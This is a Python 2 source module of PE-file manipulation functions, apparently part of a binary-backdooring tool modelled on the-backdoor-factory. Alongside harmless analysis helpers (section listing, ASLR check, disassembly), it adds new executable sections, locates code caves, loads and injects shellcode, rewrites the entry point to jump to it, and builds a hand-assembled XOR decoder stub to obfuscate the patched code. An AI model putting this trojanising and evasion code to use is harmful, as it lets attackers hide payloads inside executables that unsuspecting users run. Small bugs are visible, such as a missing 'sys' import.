# PE related functions
import os
import random
import string
import struct
from f_generic import open_file, p
from binascii import hexlify
import pefile
from pwn import disasm, asm

# Thx to https://github.com/secretsquirrel/the-backdoor-factory
jmp_symbols = ['jns', 'jle', 'jg', 'jp', 'jge', 'js', 'jl', 'jbe', 'jo',
                   'jne', 'jrcxz', 'je', 'jae', 'jno', 'ja', 'jb', 'jnp', 'jmp']

#####################################################
# Utils
#####################################################

# Load PE file
def load_pe_file(filename):
    if os.path.isfile(filename):
        print "\n[*] Loading PE file (\"%s\")" % (filename)
        try:
            return pefile.PE(filename)
        except pefile.PEFormatError:
            print "[!] File (%s) doesn't seem to be a PE file" % (filename)
            sys.exit(1)
    else:
        print "\n[!] File (%s) doesn't exist" % (filename)
        sys.exit(1)

# Write new PE file
def write_PE_file(pe_struct, out_filename):
    if (out_filename == None) or len(out_filename) == 0:
        out_filename = "%s.exe" % ("".join(random.choice(string.ascii_letters) for x in range(10)))
    print "\n[*] Writing new PE file => \"%s\"" % (out_filename)
    pe_struct.write(filename=out_filename)

# Dump opcodes from PE, and display ASM
def dump_data(pe_struct, address, size):
    blob =  pe_struct.get_data(address, size)
    for l in disasm(blob, arch="i386").split("\n"):
        print "\t%s" % (l)

# Find a specific section (with name), and give it back (with index)
def find_section(pe_struct, section_name):
    index = 0
    for section in pe_struct.sections:
        if section_name in section.Name:
            return section, index
        index+=1
    return None,-1

# Create a section name (max size: 5)
def gen_section_name(new_sec_name):
    new_section_name = ".%s" % ("".join(random.choice(string.ascii_letters) for x in range(5)))
    if new_sec_name is not None:
        if len(new_sec_name) > 0 and len(new_sec_name) <= 5:
            if (new_sec_name[0] != "."):
                new_section_name = ".%s" % (new_sec_name)
            else:
                new_section_name = "%s" % (new_sec_name)
    return new_section_name

def get_ASM_instruction(pe_struct, start_address, size=5, args=None):
    blob = pe_struct.get_data(start_address, size)
    return disasm(blob, arch="i386", offset=0)

def display_ASM_instruction(pe_struct, addr, size = 5):
    instructions = get_ASM_instruction(pe_struct, addr, size)
    print "\n - ASM instructions (@%s)" % (hex(addr))
    for i in instructions.split("\n"):
        print "\t%s" % (i)

#####################################################
# Analysis
#####################################################

# Perform a quick analysis of PE file
def pe_quick_analysis(pe_struct):
    print "\n[*] Analysis"
    # Entry Point
    print " - Entry point: 0x%x" % (pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint)

    # ASLR
    if (pe_struct.OPTIONAL_HEADER.DllCharacteristics & 0x0040):
        print " - ASLR is enabled"
    else:
        print " - ASLR is disabled"

    # PE TYPE
    if (pe_struct.PE_TYPE == 0x10b):
        print " - PE 32-bit!"
    elif (pe_struct.PE_TYPE == 0x20b):
        print " - PE 64-bit!"
    else:
        print " - Unknown type!"

# Perform a deeper analysis of PE file
def pe_deeper_analysis(pe_struct):
    # Sections
    iterate_trough_pe_sections(pe_struct)
    # Requires pwntools
    print "\n - ASM instructions @entry point"
    dump_data(pe_struct, pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint, 30)

def pe_flags_characteristics(characteristics):
    result = ""
    result += "r" if ((characteristics & 0x40000000) != 0) else "-"
    result += "w" if ((characteristics & 0x80000000) != 0) else "-"
    result += "x" if ((characteristics & 0x20000000) != 0) else "-"
    return result

#####################################################
# Sections
#####################################################

# Go through all PE sections (and display them)
def iterate_trough_pe_sections(pe_struct):
    print " - PE sections - %d section(s)" % (pe_struct.FILE_HEADER.NumberOfSections)
    print "\t\tVOffset\t\tVSize\t\tSize\t\tName\t\tFlags"
    print "\t\t------------------------------------------------------------"
    for section in pe_struct.sections:
        print "\t\t%-10s\t%-10s\t%-10s\t%-10s\t%-5s" % (hex(section.VirtualAddress), hex(section.Misc_VirtualSize), hex(section.SizeOfRawData), section.Name.replace('\x00',''), pe_flags_characteristics(section.Characteristics))

def adjust_optional_header(pe_struct):
    pe_struct.OPTIONAL_HEADER.SizeOfImage = pe_struct.sections[-1].VirtualAddress + pe_struct.sections[-1].Misc_VirtualSize
    pe_struct.OPTIONAL_HEADER.SizeOfCode = 0
    pe_struct.OPTIONAL_HEADER.SizeOfInitializedData = 0
    pe_struct.OPTIONAL_HEADER.SizeOfUninitializedData = 0

    for section in pe_struct.sections:
        if section.Characteristics & 0x00000020:
            pe_struct.OPTIONAL_HEADER.SizeOfCode += section.SizeOfRawData
        if section.Characteristics & 0x00000040:
            pe_struct.OPTIONAL_HEADER.SizeOfInitializedData += section.SizeOfRawData
        if section.Characteristics & 0x00000080:
            pe_struct.OPTIONAL_HEADER.SizeOfUninitializedData += section.SizeOfRawData

    return pe_struct

def create_new_section(pe_struct, sectionName = ".NewSec", virtualSize = 0x1000, pattern = "\x00", flags = 0xE00000E0):
    print "\n[*] Creating new section (\"%s\")" % (sectionName)

    # File alignment
    alignment = pe_struct.OPTIONAL_HEADER.FileAlignment
    # Section alignment
    SectionAlignment = pe_struct.OPTIONAL_HEADER.SectionAlignment
    # Get latest section
    latest_section = pe_struct.sections[-1]

    data = virtualSize * pattern
    offset_for_new_section = hex(latest_section.VirtualAddress + latest_section.SizeOfRawData)

    print " - Append %d bytes to PE file" % (virtualSize)

    # Append data to file
    full_length = latest_section.PointerToRawData + latest_section.SizeOfRawData
    pe_struct.__data__ = pe_struct.__data__[:full_length] + data

    # Find correct offset (with section alignment)
    virtualAddress = (pe_struct.sections[-1].VirtualAddress + pe_struct.sections[-1].Misc_VirtualSize - (pe_struct.sections[-1].Misc_VirtualSize % SectionAlignment) + SectionAlignment)

    # Add data (of the section header) to the file
    # 0x28 size of section header
    section_table_offset = pe_struct.DOS_HEADER.e_lfanew + 4 + pe_struct.FILE_HEADER.sizeof() + pe_struct.FILE_HEADER.SizeOfOptionalHeader
    section_offset = section_table_offset + pe_struct.FILE_HEADER.NumberOfSections * 0x28

    # Add data of the new section header to PE file
    pe_struct.set_bytes_at_offset(section_offset, sectionName)              # Name of new section
    pe_struct.set_dword_at_offset(section_offset + 0x08, virtualSize)       # virtualSize
    pe_struct.set_dword_at_offset(section_offset + 0x0C, virtualAddress)    # virtualAddress
    pe_struct.set_dword_at_offset(section_offset + 0x10, virtualSize)       # RawSize
    pe_struct.set_dword_at_offset(section_offset + 0x14, full_length)       # RawAddress
    pe_struct.set_dword_at_offset(section_offset + 0x18, 0x00000000)        # RelocAddress
    pe_struct.set_dword_at_offset(section_offset + 0x1C, 0x00000000)        # LineNumbers
    pe_struct.set_word_at_offset(section_offset + 0x20, 0x0000)             # RelocationsNumber
    pe_struct.set_word_at_offset(section_offset + 0x22, 0x0000)             # LinenumbersNumber
    pe_struct.set_dword_at_offset(section_offset + 0x24, flags)             # Flags

    # Add (+1) new section
    pe_struct.FILE_HEADER.NumberOfSections +=1

    pe_struct.parse_sections(section_table_offset) # Fetch the PE file sections
    pe_struct = adjust_optional_header(pe_struct)

    return pe_struct, pe_struct.sections[-1]

# XOR a specific section
def xor_section(pe_struct, section_name, key=0xA0, offset=5):
    section, index = find_section(pe_struct, section_name)
    if section != None:
        result = ""
        # Go through all data, from Entry point to end of section
        for d in section.get_data(pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint + offset):
            result += chr(ord(d)^key)
        # Add XORed data @ VirtualAddress
        pe_struct.set_bytes_at_rva(pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint + offset, result)

def get_section_flags(pe_struct, section_name):
    section, index = find_section(pe_struct, section_name)
    return pe_flags_characteristics(section.Characteristics)

def change_section_flags(pe_struct, section_name, characteristics = 0xE00000E0):
    section, index = find_section(pe_struct, section_name)
    section.Characteristics = 0xE00000E0
    print "\n[*] Updating section flags (%s => \"%s\")" % (section.Name.replace("\x00",""), hex(characteristics))

# Look for code cave inside PE file's sections
def find_code_cave(pe_struct, min_size=100):
    print "\n[*] Looking for code caves"
    result_code_cave = list()
    index = 0

    for section in pe_struct.sections:
        section_name = section.Name.replace("\x00","")
        print "\t- Section: %s - @%s" % (section_name, hex(section.VirtualAddress))
        current_size = 0
        current_address = 0
        n = 0
        for d in section.get_data():
            if d == "\x00":
                current_size += 1
                if current_address == 0:
                    current_address = section.VirtualAddress + n
            else:
                if current_size >= min_size:
                    print "\t [%d] -> Found a code cave: %d bytes, starting @%s" % (index, current_size, hex(current_address))
                    index+=1
                    result_code_cave.append((int(current_address), section_name))
                current_size = 0
                current_address = 0
            n+=1
    return result_code_cave

# Open shellcode file, returns shellcode (proper format) + shellcode size
def open_shellcode_file(filename):
    shellcode_content = open_file(filename)
    shellcode = "\x90" * 4 + shellcode_content.decode('string-escape')
    print "\n[*] Loading shellcode (size: %d)" % (len(shellcode))
    return shellcode, len(shellcode)
    #print disasm(shellcode, arch="i386")

# Injection shellcode into "section_name"
def inject_shellcode(pe_struct, shellcode, addr):
    #section, index = find_section(pe_struct, section_name)
    pe_struct.set_bytes_at_rva(addr, shellcode)
    print "\n[*] Injecting shellcode @ \"%s\"" % (hex(addr))
    #return section.VirtualAddress

# Update entry point with data
def update_entry_point(pe_struct, jmp_addr, data):
    print "\n[*] Updating EntryPoint (jmp reltv %s)" % (hex(jmp_addr))
    pe_struct.set_bytes_at_rva(pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint, data)

#####################################################
# XOR
#####################################################

def figure_prologue(pe_struct, verbose=False):
    # Get prologue
    prologue_instruction = get_ASM_instruction(pe_struct, pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint, 30)
    count = 0
    instructions = []

    if verbose:
        print " - ASM instructions @EntryPoint (%s)" % (hex(pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint))
        for i in prologue_instruction.split("\n"):
            print "\t%s" % (i)

    for inst in prologue_instruction.split("\n"):
        splitted_instructions = inst.split("  ")

        opcode = splitted_instructions[0].replace(" ","")               # Op code
        asm_mnemo = "".join(splitted_instructions[1:])                  # asm mnemonic
        # Append instructions
        instructions.append((opcode, asm_mnemo))
        count += len(opcode)
        if (count >= 6) or (count != 0) and (count % 5 == 0):
            break
    return instructions

# Create XOR (ASM) routine
def xor_routine_asm(end_address, prologue="", key=0xA0):
    xor_routine = "\x90\x90\x90\x90"                    # NOPs
    xor_routine += "\x58"                               # POP EAX
    xor_routine += "\x50"                               # PUSH EAX
    xor_routine += "\x89\xc5"                           # MOV EBP, EAX
    xor_routine += "\x81\xc5" + p(end_address)          # ADD EBP, {ADDR}
    xor_routine += "\x80\x30" + chr(key)                # Key for XOR routine
    xor_routine += "\x40"                               # INC EAX
    xor_routine += "\x39\xe8"                           # CMP EAX, EBP
    xor_routine += "\x0f\x8e\xf4\xff\xff\xff"           # JLE backwards
    xor_routine += "\x58"                               # POP EAX
    return xor_routine
